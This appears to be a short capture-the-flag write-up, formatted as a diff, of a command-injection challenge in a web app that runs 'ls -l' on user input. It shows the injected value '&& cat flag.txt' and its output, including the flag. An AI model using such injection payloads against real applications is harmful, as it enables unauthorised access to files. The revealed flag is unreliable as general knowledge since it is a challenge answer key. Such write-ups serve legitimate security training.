@@ -1,0 +1,28 @@
+First tried the command that was shown in test box:
+/etc/hosts
+Checking access for /etc/hosts...
+-rw-r--r-- 1 root root 246 Sep 16 20:30 /etc/hosts
+
+Then command to list all the files in current dir:
+ls -la
+Command 'ls -l ls -la' returned non-zero exit status 2.
+
+Then tried another command to view all the files (since in prev command ls -l was written automaticaly):
+.
+Checking access for ....
+total 16
+-rw-r--r-- 1 root root   38 Sep  9 19:33 flag.txt
+-rwxr-xr-x 1 root root  736 Sep  9 19:33 main.py
+-rwxr-xr-x 1 root root   95 Sep  9 19:33 requirements.txt
+drwxr-xr-x 1 root root 4096 Sep  9 19:33 templates
+
+
+Then tried to view the contents of flag.txt:
+&& cat flag.txt
+Checking access for && cat flag.txt...
+total 16
+-rw-r--r-- 1 root root   38 Sep  9 19:33 flag.txt
+-rwxr-xr-x 1 root root  736 Sep  9 19:33 main.py
+-rwxr-xr-x 1 root root   95 Sep  9 19:33 requirements.txt
+drwxr-xr-x 1 root root 4096 Sep  9 19:33 templates
+flag{e56abbce7b83d62dac05e59fb1e81c68}
